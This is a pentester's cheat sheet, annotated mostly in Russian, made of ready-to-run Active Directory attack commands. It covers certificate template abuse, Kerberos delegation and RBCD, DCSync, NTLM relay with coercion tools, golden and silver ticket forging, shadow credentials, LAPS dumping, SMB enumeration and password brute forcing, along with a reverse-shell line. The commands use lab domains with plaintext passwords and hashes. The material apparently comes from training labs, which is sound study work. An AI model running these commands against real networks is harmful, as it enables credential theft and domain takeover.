  		certipy req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -dc-ip 10.129.228.237 -template User

			узнаем контроллер домена и центр сертификации
  
		certipy find -u 'BlWasp@lab.local' -p 'Password123!' -stdout -vulnerable

			Вводим в домен новую машинну с днс контроллера домена
  
		certipy account create -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.228.134 -user NEWMACHINE -dns DC02.LAB.LOCAL

			запрашиваем для нее сертиикат
		pcertipy-ad req -u 'NEWMACHINE$' -p 'TwiLzWLT56X0Pd73' -ca domain-DC-CA-1 -template 'Machine' -dc-ip 192.168.134.10 -dns dc.domain.local

			авторизуемся с сертификатом и получаем креды

		certipy auth -pfx dc02.pfx

			делаем DCSYNC
		impacket-secretsdump 'LAB.LOCAL/dc02$@DC02.LAB.LOCAL' -hashes :6a5bfcba90a4ed0a8dc96448b7646c3e
			а потом  подключаемся
  		psexec.py lab.local/Administrator@172.16.19.5 -hashes aad3b435b51404eeaad3b435b51404ee:6e599ada28db049c044cc0bb4afeb73d


# DELEGATION

* Find accaunt with delegation
  
  		findDelegation.py INLANEFREIGHT.LOCAL/carole.rose:jasmine
		nxc ldap  172.16.8.3 -u annette.jackson -p horses -k --trusted-for-delegation --find-delegation
* Unconstrained delegation

  		.\Rubeus.exe monitor /interval:5 /nowrap		(Ожидание аутентификации пользователя)

  		.\Rubeus.exe asktgs /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /service:cifs/dc01.INLANEFREIGHT.local /ptt		Использование билета для запроса другого билета
		.\Rubeus.exe renew /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /ptt 		Обновление билета
		dir \\dc01.inlanefreight.local\c$

		------------------(провокация на аутентификацию контроллера на хосте)-----------------
  
		.\SpoolSample.exe dc01.inlanefreight.local sql01.inlanefreight.local 
		.\Rubeus.exe monitor /interval:5 /nowrap
		.\Rubeus.exe renew /ticket:doIFZjCCBWKgAwIBBaEDAgEWooIEWTCCBFVhggRRMIIETaADAgEFoRUbE0lOTEFORUZSRUl /ptt

    		mimikatz.exe ---> lsadump::dcsync /user:sarah.lafferty
  		.\Rubeus.exe asktgt /rc4:0fcb586d2aec31967c8a310d1ac2bf50 /user:sarah.lafferty /ptt        (Запрос билета для любого пользователя)
  		dir \\dc01.inlanefreight.local\c$

  		-------------------S4U2self для не-контроллеров домена-----------

  		.\Rubeus.exe s4u /self /nowrap /impersonateuser:Administrator /altservice:CIFS/dc01.inlanefreight.local /ptt /ticket:doIFZjCCBWKgAwIBBaEDAgEWooIEWTCCB<SNIP>

     		ls \\dc01.inlanefreight.local\c$

* Переделать kirbi --> ccache
		(может иногда понадобится renew)
  		echo "doIF7....jCCB==" > ticket.base64
		base64 -d ticket.base64 > ticket.kirbi
		ticketConverter.py ticket.kirbi ticket.ccache
  		export KRB5CCNAME=$(pwd)/ticket.ccache
  		klist
  
* Constrained Delegation from Windows (  Constrained w/ Protocol Transition)

		Set-ExecutionPolicy Unrestricted
  		Import-Module .\PowerView.ps1
		Get-DomainComputer -TrustedToAuth		(перечисление служб для делегирования)

  		на хосте, где настроено делегирование
		.\mimikatz.exe privilege::debug sekurlsa::msv exit 	(получение хеша ПК)
		(ПОЛУЧЕНИЕ TGS ДЛЯ ПОЛЬЗОВАТЕЛЯ ADMINISTRATOR ЧЕРЕЗ S4USELF)
  		.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.inlanefreight.local /altservice:HTTP /user:DMZ01$ /rc4:ff955e93a130f5bb1a6565f32b7dc127 /ptt 
  		klist
  		Enter-PSSession ws01.inlanefreight.local  (evil-winrm from windiws)
  
* Constrained Delegation from Linux (  Constrained w/ Protocol Transition)

  		findDelegation.py INLANEFREIGHT.LOCAL/carole.rose:jasmine
  		getST.py -spn TERMSRV/DC01 'INLANEFREIGHT.LOCAL/beth.richards:B3thR!ch@rd$' -impersonate Administrator   (создать действительный TGS от произвольного пользователя для доступа к TERMSRV)
		export KRB5CCNAME=./Administrator.ccache
		psexec.py -k -no-pass INLANEFREIGHT.LOCAL/administrator@DC01 -debug


  
* RBCD
* (ИЗ ВИНД0ВС)
		https://github.com/tothi/rbcd-attack
*** Поиск RBCD

  		# import the PowerView module
		Import-Module C:\Tools\PowerView.ps1

		# get all computers in the domain
		$computers = Get-DomainComputer

		# get all users in the domain
		$users = Get-DomainUser

		# define the required access rights
		$accessRights = "GenericWrite","GenericAll","WriteProperty","WriteDacl"

		# loop through each computer in the domain
		foreach ($computer in $computers) {
   		 # get the security descriptor for the computer
    		$acl = Get-ObjectAcl -SamAccountName $computer.SamAccountName -ResolveGUIDs

    		# loop through each user in the domain
    		foreach ($user in $users) {
       		 # check if the user has the required access rights on the computer object
       		 $hasAccess = $acl | ?{$_.SecurityIdentifier -eq $user.ObjectSID} | %{($_.ActiveDirectoryRights -match ($accessRights -join '|'))}

        	if ($hasAccess) {
            	Write-Output "$($user.SamAccountName) has the required access rights on $($computer.Name)"
        	}
    		}
		}


*** Использование PowerMad для создания поддельного компьютера

  		https://github.com/Kevin-Robertson/Powermad
		Import-Module .\Powermad.ps1
		New-MachineAccount -MachineAccount HACKTHEBOX -Password $(ConvertTo-SecureString "Hackthebox123+!" -AsPlainText -Force)

*** Затем мы добавляем эту учетную запись компьютера в список доверия целевого компьютера, что возможно, поскольку у злоумышленника есть GenericAll ACLна этом компьютере (в данном случае на dc01): 

		Import-Module .\PowerView.ps1
		$ComputerSid = Get-DomainComputer HACKTHEBOX -Properties objectsid | Select -Expand objectsid
		$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
		$SDBytes = New-Object byte[] ($SD.BinaryLength)
		$SD.GetBinaryForm($SDBytes, 0)
		$credentials = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\carole.holmes", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force)
		Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $credentials -Verbose
*** Получим компьютерные хэши с помощью Rubeus 
		
  		.\Rubeus.exe hash /password:Hackthebox123+! /user:HACKTHEBOX$ /domain:inlanefreight.local

*** Теперь, когда у нас есть хэш пароля нашей новой учетной записи компьютера, мы запрашиваем билет TGS для сервиса. cifs/dc01.inlanefreight.local, что позволяет нам получить доступ к цели (Мы также можем использовать host,RPCSS,wsman,http,ldap,krbtgt,winrm)

		.\Rubeus.exe s4u /user:HACKTHEBOX$ /rc4:CF767C9A9C529361F108AA67BF1B3695 /impersonateuser:administrator /msdsspn:cifs/dc01.inlanefreight.local /ptt
		klist
  		ls \\dc01.inlanefreight.local\c$
  
*** другой способ
  		
    		C:\Tools\mimikatz_trunk\x64\mimikatz.exe

		mimikatz # token::elevate

		mimikatz # lsadump::secrets   			----- Запросим пароль учетки имеюзей право делегироватся

		Затем просим TGT

  		kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:redacted

		Затем просим TGS

		kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones(админ на нужной такчуке) /service:http/THMSERVER1.za.tryhackme.loc
		tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc

		Затем импортируем TGS через mimikatz

		mimikatz # privilege::debug
		Privilege '20' OK

		mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

		mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

		и входим

		И заходим через wsman


		New-PSSession -ComputerName thmserver1.za.tryhackme.loc

		Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc

* (RBCD from LINUX)
	*** дОБАВЛЯЕМ КОМПУТЕР В ДОМЕН
  
  		addcomputer.py -computer-name 'HACKTHEBOX$' -computer-pass 'Hackthebox123!' -dc-ip 10.129.205.35 inlanefreight.local/carole.holmes:Y3t4n0th3rP4ssw0rd
  	*** Затем нам необходимо добавить эту учетную запись в список доверия целевого компьютера (DC01), что возможно, поскольку carole.holmes имеет GenericAll ACLна этом компьютере
  	Нуежен тот кто влияет на конечный хост (DC, SQL, HTTP) потому что нужно добавить делегата в ACL хоста

  		impacket-rbcd -dc-ip dc01 -delegate-to DC01$ -delegate-from HACKTHEBOX$ inlanefreight.local/carole.holmes:Y3t4n0th3rP4ssw0rd -action write
		ИЛИ
  		python3 rbcd.py -dc-ip 10.129.205.35 -t DC01 -f HACKTHEBOX inlanefreight\\carole.holmes:Y3t4n0th3rP4ssw0rd

  		или
		
  		Получаем TGT TGS self and Proxy. Запрашивает тикет от имени фейкового хоста с ипмперсонификацией
		далее
		getST.py -spn cifs/DC01.inlanefreight.local -impersonate Administrator -dc-ip 10.129.205.35 inlanefreight.local/HACKTHEBOX:'Hackthebox123!'
  		
		getST.py -spn cifs(ldap)/sql.domain.local -impersonate Administrator -dc-ip 192.168.134.10 domain.local/HACK:Password123

  *** и логинимся с тикетом

  		export KRB5CCNAME=administrator.ccache
		psexec.py -k -no-pass dc01.inlanefreight.local
  		Psexec.py -k -no-pass sql.domain.local -dc-ip 192.168.134.11
		wmiexec.py DC01.INLANEFREIGHT.LOCAL -k -no-pass
  		или dcsync

  * (RBCD from LINUX через ntlmrelay) по умолчанию компьютер может редактировать свои собственные msDS-AllowedToActOnBehalfOfOtherIdentityатрибут!!!
 
    		sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --add-computer 'plaintext$' (добавляем компутер в домен)
    		sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --escalate-user 'plaintext$' --no-dump -debug (повышение привелегий)
    		crackmapexec smb 172.16.117.3 -u anonymous -p '' -M drop-sc -o URL=https://172.16.117.30/testing FILENAME=@secret (включаем webdaw)
    		crackmapexec smb 172.16.117.0/24 -u plaintext$ -p o6@ekK5#rlw2rAe -M webdav (проверяем где включился)
    		sudo python3 Responder.py -I ens192 (для коонтроля smb and http = off)
    		sudo ntlmrelayx.py -t ldaps://INLANEFREIGHT\\'SQL01$'@172.16.117.3 --delegate-access --escalate-user 'plaintext$' --no-smb-server --no-dump   (добавляем RBCD на SQL01$)
    		python3 printerbug.py inlanefreight/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.60 LINUX01@80/print (вызывае аутентификацию -- LINUX01@80/print -то что ловится Responderom)
		findDelegation.py INLANEFREIGHT.LOCAL/administrator -hashes aad3b435b51404eeaad3b435b51404ee:d1e532fdcdea711011a6b13bcf390401  (проверяем сработало ли)
    		getST.py -spn cifs/sql01.inlanefreight.local -impersonate Administrator -dc-ip 172.16.117.3 "INLANEFREIGHT"/"plaintext$":"xw{4tWh4sT^+q-$"  (заказываем TGS)
    		KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass sql01.inlanefreight.local (Заходим)

--------------------------------------------------------------------------
  		Sudo certipy-ad auth -pfx sql.pfx -domain domain.local -dc-ip 192.168.134.10 (DC) -ldap-shell
  				set_rbcd SQL$ HACK$
				перед этим создаем фейковый хост
  				addcomputer.py -computer-name 'HACKTHEBOX$' -computer-pass Hackthebox123+\! -dc-ip 10.129.205.35 inlanefreight.local/carole.holmes 
--------------------------------------------------------------------------
    		
**** RBCD из Linux, когда MachineAccountQuota установлен на 0 но пользователь с правами на изменение acl
		получаем хеш пароля
		pypykatz crypto nt 'Y3t4n0th3rP4ssw0rd'

		

* DCSYNC

		Rubeus triage
  		Rubeus dump
		билет в файл и убираем пробелы
затем

  		[IO.File]::WriteAllBytes("C:\Users\spirit\Desktop\DC.kirbi", [Convert]::FromBase64String("Base64"))  (путь только полный!!!! а  base 64 вставляем билет без пробелов)

      		kerberos::ptt DC.kirbi
		lsadump::dcsync /domain:domain.local /user:Administrator
или
  		
		nano ticket.kirbi_b64       
  		base64 -d ticket.kirbi_b64 > ticket_real.kirbi
   		ticketConverter.py ticket_real.kirbi ticket.ccache
		export KRB5CCNAME=ticket.ccache 
        	crackmapexec smb dc.domain.local -k --use-kcache --ntds

или
  		KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'
		secretsdump.py -k -no-pass -dc-ip '10.129.205.35' @'dc01.inlanefreight.local'
    		
# NTLMRELAY ATTACK
	Запускаем респондер и убираем в нем smb = off and http = off
	
 	python3 Responder.py -I ens192
	Запускаем ntlmrelayx

 	ntlmrelayx.py -t mssql://172.16.117.60 -smb2support -socks
  	ntlmrelayx.py -t all://172.16.117.60 -smb2support -socks
	ntlmrelayx.py -tf hosts.txt -smb2support -socks

	proxychains -q mssqlclient.py INLANEFREIGHT/nports@172.16.117.60 -windows-auth -no-pass
*** на ldap 
	
 	sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --lootdir ldap_dump (Дамп домена)
 	sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --add-computer 'plaintext$'   (создание учетной записи компутера)
	sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --escalate-user 'plaintext$' --no-dump -debug (Повышение привилегий через злоупотребление ACL)
 
*** WEB DAV 
 	 
   	crackmapexec smb 172.16.117.3 -u anonymous -p '' -M drop-sc -o URL=https://172.16.117.30/testing SHARE=Testing FILENAME=@secret	 (включаем вебдав но почему то на 172.16.117.60)
	 crackmapexec smb 172.16.117.60 -u plaintext$ -p o6@ekK5#rlw2rAe -M webdav	(проверка включения web DAV)
	python3 printerbug.py inlanefreight/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.60 SUPPORTPC@80/print    		(использование printer bug для web dav)
 	sudo python3 Responder.py -I ens192

*** Printer BUG

 	https://github.com/dirkjanm/krbrelayx
 	python3 printerbug.py inlanefreight/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.3 172.16.117.30      (откуда и куда)
	python3 Responder.py -I ens192

*** Petit Potam
	
 	https://github.com/ly4k/PetitPotam
 	python3 PetitPotam.py 172.16.117.30(мой) 172.16.117.3(контроллер) -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' -d inlanefreight.local	(через smb)
  	python3 PetitPotam.py WIN-MMRQDG2R0ZX@80/files 172.16.117.60 -u 'plaintext$' -p 'o6@ekK5#rlw2rAe'		(через webDAV)
	sudo python3 Responder.py -I ens192

*** Coercer

 	Coercer coerce -t 172.16.117.50 -l 172.16.117.30 -u 'administrator' -d inlanefreight.local -v --hashes aad3b435b51404eeaad3b435b51404ee:d1e532fdcdea711011a6b13bcf390401 --always-continue
	sudo python3 Responder.py -I ens192
*** * (RBCD from LINUX через ntlmrelay) по умолчанию компьютер может редактировать свои собственные msDS-AllowedToActOnBehalfOfOtherIdentityатрибут!!!
 
    		sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --add-computer 'plaintext$' (добавляем компутер в домен)
    		sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --escalate-user 'plaintext$' --no-dump -debug (повышение привелегий)
    		crackmapexec smb 172.16.117.3 -u anonymous -p '' -M drop-sc -o URL=https://172.16.117.30/testing FILENAME=@secret (включаем webdaw)
    		crackmapexec smb 172.16.117.0/24 -u plaintext$ -p o6@ekK5#rlw2rAe -M webdav (проверяем где включился)
    		sudo python3 Responder.py -I ens192 (для коонтроля smb and http = off)
    		sudo ntlmrelayx.py -t ldaps://INLANEFREIGHT\\'SQL01$'@172.16.117.3 --delegate-access --escalate-user 'plaintext$' --no-smb-server --no-dump   (добавляем RBCD на SQL01$)
    		python3 printerbug.py inlanefreight/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.60 LINUX01@80/print (вызывае аутентификацию -- LINUX01@80/print -то что ловится Responderom)
		findDelegation.py INLANEFREIGHT.LOCAL/administrator -hashes aad3b435b51404eeaad3b435b51404ee:d1e532fdcdea711011a6b13bcf390401  (проверяем сработало ли)
    		getST.py -spn cifs/sql01.inlanefreight.local -impersonate Administrator -dc-ip 172.16.117.3 "INLANEFREIGHT"/"plaintext$":"xw{4tWh4sT^+q-$"  (заказываем TGS)
    		KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass sql01.inlanefreight.local (Заходим)


*** SHADOW CREDENTIALS (через ntlm relay)

	sudo python3 Responder.py -I ens192
	sudo ntlmrelayx.py -t ldap://INLANEFREIGHT\\CJAQ@172.16.117.3 --shadow-credentials --shadow-target jperez --no-da --no-dump --no-acl --no-smb-server  (Ловим CJAQ и заставляем его отдать сертификатShadowCredentials над jperz)
 	python3 gettgtpkinit.py -cert-pfx rbnYdUv8.pfx -pfx-pass NRzoep723H6Yfc0pY91Z INLANEFREIGHT.LOCAL/jperez jperez.ccache (Сохраняем TGT из сертификата)
	KRB5CCNAME=jperez.ccache evil-winrm -i dc01.inlanefreight.local -r INLANEFREIGHT.LOCAL


# NTLMRELAY когда у одного компа есть админские права для другого

		у 14 есть разрешение на админство от 12
  		
		sudo impacket-ntlmrelayx -t smb://192.168.134.14 --delegate -smb2support

  		на своем хосте

    		proxychains  coercer coerce -l 192.168.134.24 -t 192.168.134.12 -u s.ivanov -p DgdCQTghHGA2ad -d domain.local


на своем хосте запускаем ntlmrelay  м слушаем серевер 1 -----   сервер 2   админ для сервер 1 

	python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"THMSERVER1 (IP)" -debug   

на компроментате запускаем

	C:\Tools\>SpoolSample.exe THMSERVER2.za.tryhackme.loc (IP) "Attacker IP (мой 3 IP)"



# Unconstrained delegation (Windows)

		.\Rubeus.exe tgtdeleg /nowrap
	$  base64 ticket.kirbi.b64 -d > ticket.kirbi
	$ impacket-ticketConverter ticket.kirbi ticket.ccache
	$ export KRB5CCNAME=ticket.ccache
	$ impacket-secretsdump licordebellota.htb/pivotapi\$@pivotapi.licordebellota.htb -dc-ip 10.10.10.240 -no-pass -k

	# TGT Unconstrained delegation
	(Нужен rubeus и mimikatz и printspooler)
	------Нужен скомпроментированный сервер службы sql или еще чего и админ права на нем------

	1. Получить TGT привелигированного юзера или компутера

	.\Rubeus.exe monitor /interval:5 /nowrap

	.\SpoolSample.exe dc01.inlanefreight.local sql01.inlanefreight.local

  	2. Обновляем его в память
   
	.\rubeus.exe renew /ticket:<............> /ptt
 	
	3. Мимикатзом делаем DCSYNC

  	lsadump::dcsync /user:Administrator

	4. Крафтим TGT

   	.\Rubeus asktgt /rc4:hashhhh /user:Administrator /ptt

	5. Юзаем
    	 dir \\dc01.domen.local\c$\flag.txt
    
	6. Если уже сть билеты в памяти то можно просто

  	./rubeus.exe dump /nowrap
		И ЗАТЕМ
	.\rubeus.exe renew /ticket:<............> /ptt

	
# golden ticket (Windows)
	***** через мимикатз (Windows)
		нужны..
    	Domain Name
     		whoami /all
    	Domain SID
    		Import-Module .\PowerView.ps1
		Get-DomainSID
  		whoami /all
        KRBTGT's hash
	в мимкатз --> .\mimikatz.exe --> lsadump::dcsync /user:krbtgt /domain:inlanefreight.local
 	Username to Impersonate ---> administrator
  
	kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:810d754e118439bab1e1d13216150299 /ptt
   
   	kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt
 	kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt
		
	/admin — имя пользователя, которое мы хотим выдать за себя. Это не обязательно должен быть действительный пользователь.
	/domain — полное доменное имя домена, для которого мы хотим создать билет.
	/id — RID пользователя. По умолчанию Mimikatz использует RID 500, который является RID учетной записи администратора по умолчанию.
	/sid — SID домена, для которого мы хотим сгенерировать билет.
	/krbtgt — NTLM- хеш учетной записи KRBTGT.
	/endin — срок действия билета. По умолчанию Mimikatz генерирует билет, действительный в течение 10 лет. по умолчанию Политика Kerberos для AD составляет 10 часов (600 минут).
	/renewmax — максимальный срок действия билета с продлением. По умолчанию Mimikatz генерирует билет, действительный в течение 10 лет. по умолчанию Политика Kerberos для AD составляет 7 дней (10080 минут).
	/ptt — этот флаг сообщает Mimikatz о необходимости внедрения билета непосредственно в сеанс, что означает, что он готов к использованию. 

 ***Проверка
 
	klist
 	PS C:\Tools\mimikatz_trunk\x64> dir \\thmdc.za.tryhackme.loc\c$\
	Enter-PSSession dc01
# golden ticket (Linux)
	SID домена
	impacket-lookupsid inlanefreight.local/htb-student@dc01.inlanefreight.local -domain-sids
 	Создаем TGT
  	impacket-ticketer -nthash c0231bd8a4a4de92fca0760c0ba9e7a6 -domain-sid S-1-5-21-1870146311-1183348186-593267556 -domain inlanefreight.local Administrator
	klist
 	Заходим...
	wmiexec.py DC01.INLANEFREIGHT.LOCAL -k -no-pass

# silver ticket (Windows)
	
 	*** Создать Серебряный Билет 
	mimikatz.exe "kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:ff955e93a130f5bb1a6565f32b7dc127 /target:sql01.inlanefreight.local /service:cifs /ticket:sql01.kirbi" exit
 	
  	*** Создать жертвенный процесс 
  	Rubeus.exe createnetonly /program:cmd.exe /show
   	Rubeus.exe ptt /ticket:sql01.kirbi
	
  	*** Проверяем
   	PSExec.exe -accepteula \\sql01.inlanefreight.local cmd

   	
    	kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt

   	 kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:THMSERVER1 /rc4:4c02d970f7b3da7f8ab6fa4dc77438f4 /service:cifs /ptt

      	 /admin — имя пользователя, которое мы хотим выдать за себя. Это не обязательно должен быть действительный пользователь.
   	 /domain — полное доменное имя домена, для которого мы хотим создать билет.
   	 /id — RID пользователя. По умолчанию Mimikatz использует RID 500, который является RID учетной записи администратора по умолчанию.
   	 /sid — SID домена, для которого мы хотим сгенерировать билет.
   	 /target — имя хоста нашего целевого сервера. Давайте сделаем THMSERVER1.za.tryhackme.loc, но это может быть любой хост, присоединенный к домену.
   	 /rc4 - NTLM -хеш учетной записи машины нашей цели. Просмотрите результаты синхронизации постоянного тока и найдите NTLM- хеш THMSERVER1$. Знак $ указывает, что это учетная запись компьютера.
  	  /service — услуга, которую мы запрашиваем в нашем TGS. CIFS — беспроигрышный вариант, поскольку он обеспечивает доступ к файлам.
  	  /ptt — этот флаг сообщает Mimikatz о необходимости внедрения билета непосредственно в сеанс, что означает, что он готов к использованию. 

проверка

	dir \\thmserver1.za.tryhackme.loc\c$\
      
# silver ticket (linux)  

		SID domain 
  
		impacket-lookupsid inlanefreight.local/htb-student@dc01.inlanefreight.local -domain-sids

  		крафтим silver тикет from administrator и нужен hash хоста$

  		impacket-ticketer -nthash 542780725df68d3456a0672f59001987 -domain-sid S-1-5-21-1870146311-1183348186-593267556 -domain inlanefreight.local -spn cifs/dc01.inlanefreight.local Administrator
    
		impacket-ticketer -nthash 1443EC19DA4DAC4FFC953BCA1B57B4CF -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -domain sequel.htb -dc-ip dc.sequel.htb -spn nonexistent/DC.SEQUEL.HTB Administrator

  		идем к службе ---->
    
		export KRB5CCNAME=Administrator.ccache;
  		impacket-mssqlclient -k dc.sequel.htb
 		impacket-wmiexec -k -no-pass dc01.inlanefreight.local

# Добавление компутера в домен

		impacket-addcomputer authority.htb/svc_ldap:lDaP_1n_th3_cle4r! -method LDAPS -computer-name 'Evil-PC' -computer-pass 'Password123'

		sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --add-computer 'plaintext$'  (через ntlmrelay) + нужна провокация на идентификацию respnder or coerser)
  		
 * PSEXEC ПО БЕЛЕТУ PSExec.exe -accepteula \\sql01.inlanefreight.local cmd
* smbexec xthtp ntlmrelay  proxychains4 -q smbexec.py INLANEFREIGHT/PETER@172.16.117.50 -no-pass

# RunAsCS

.\RunasCs backup IZtLVsqMDMENsTTekNwKwHGrFpmANUFgxOwvHREm --bypass-uac --logon-type 8 cmd.exe -r 10.10.14.49:445

#ACL ( Net rpc and bloodyad and certypy

net rpc group addmem "SERVICEMGMT" "OOREND" -U "REBOUND.HTB/OOREND" -S "REBOUND.HTB" 		(Добавить пользователя в группу)

или 

https://github.com/CravateRouge/bloodyAD?tab=readme-ov-file

python3 -m venv venv

source venv/bin/activate

pip3 install -r requirements.txt  


./bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb  add groupMember ServiceMgmt oorend		((Добавить пользователя в группу))

net rpc group members "ServiceMGMT"  -U "rebound.htb"/"oorend"%'1GR8t@$$4u' -S "dc01.REBOUND.HTB"		(проверка членов группы)

./bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb  add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB'  oorend		(Generic all - добавить себя в OU )

./bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb  set password winrm_svc 'Password123!' 		(смена пароля при наличии прав)

# SHADOW CREDENTIALS
 
 certipy shadow auto -username oorend@rebound.htb -password '1GR8t@$$4u' -k -account winrm_svc -target dc01.rebound.htb		(shadow credential)
 
./bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb  add shadowCredentials winrm_svc 		(shadow credential)

# SHADOW CREDENTIALS (через ntlm relay)

	sudo python3 Responder.py -I ens192
	sudo ntlmrelayx.py -t ldap://INLANEFREIGHT\\CJAQ@172.16.117.3 --shadow-credentials --shadow-target jperez --no-da --no-dump --no-acl --no-smb-server  (Ловим CJAQ и заставляем его отдать сертификатShadowCredentials над jperz)
 	python3 gettgtpkinit.py -cert-pfx rbnYdUv8.pfx -pfx-pass NRzoep723H6Yfc0pY91Z INLANEFREIGHT.LOCAL/jperez jperez.ccache (Сохраняем TGT из сертификата)
	KRB5CCNAME=jperez.ccache evil-winrm -i dc01.inlanefreight.local -r INLANEFREIGHT.LOCAL

 
 # ПОЛУЧЕНИЕ TGT из сертификатов
 
 python3 PKINITtools/gettgtpkinit.py -cert-pem ipWe9rd5_cert.pem -key-pem ipWe9rd5_priv.pem rebound.htb/winrm_svc ipWe9rd5.ccache 	(получение билета керберос)

 python3 gettgtpkinit.py -dc-ip 172.16.117.3 -cert-pfx ws01.pfx 'INLANEFREIGHT.LOCAL/WS01$' ws01.ccache

 export KRB5CCNAME=ipWe9rd5.ccache

 evil-winrm -i dc01.rebound.htb -r rebound.htb


 certipy-ad auth -pfx baker.pfx -dc-ip 10.10.11.69

 
 # Получение пароля LAPS Admin

	Юзер состоит в групе LAPS Admin
	
		https://github.com/n00py/LAPSDumper.git
    	
		$ python laps.py -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc01.domain.local

  		В Виндовс Laps

		https://github.com/leoloobeek/LAPSToolkit.git
	
		Find-AdmPwdExtendedRights -Identity * (THMorg)
		runas /netonly /user:bk-admin "cmd.exe"
		Get-AdmPwdPassword -ComputerName Creds-Harvestin

	

 

# Сетевые шары

# SMB

smbcacls -N '//10.10.10.103/Department Shares'

smbclient -L 10.10.217.189 - подключение по смб

smbclient --no-pass //10.10.217.189/Users -смотрим папки

smbclient //10.10.218.125/users -c 'recurse;ls'   (Ркурсивно просмотреть все шары)

*** Скачать рекурсивно все файлы изнутри

smb: \> recurse on
smb: \> prompt off
smb: \> mget *



smbclient //192.168.50.232/Users -U ''

smbclient -N //192.168.50.232/Users 

smbclient //192.168.50.232/Users -U Alexs

smbclient -L 192.168.50.200 -U Administrator

smbclient //192.168.50.162/Users -U Alex - переход по директориям

<< smbclient \\\\192.168.50.232\\Users -U Alexs >>

smbmap -H 10.10.149.120 -u anonymous

smbmap -u '' -p '' -H 10.10.149.120



smbmap -u 'john' -p 'nt:lm_hash' -H 192.168.50.200

smbmap -d active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -H 10.10.10.100      !Для домена!

impacket-smbclient Tiffany.Molina:NewIntelligenceCorpUser9876@10.10.10.248
impacket-smbclient -k absolute.htb/svc_smb@dc.absolute.htb -target-ip 10.10.11.181 (перед этим получить tgt и  export KRB5CCNAME= )
- shares - list available shares
- use {sharename} - connect to an specific share

Скачать сетевую шару!!!

smbget -R smb://10.10.11.207/Development

Примонтировать smb шару

mount -t cifs //10.10.10.134/Backups /mnt/smb


# (NXC) crackmapexec

Показать доступные пользователю шары

	crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva --shares

Брут локального администратора 

	cme smb discovery/hosts/windows.txt --local-auth -u Administrator -p passwords.txt
 
	выполнение комманнд

	crackmapexec 192.168.50.200 -u 'Administrator' -p 'Pass1' 'Pass2' -x ipconfig

	crackmapexec smb 10.10.38.153 -u 'nik' -p 'ToastyBoi!' --shares  -Доступные шары для узера

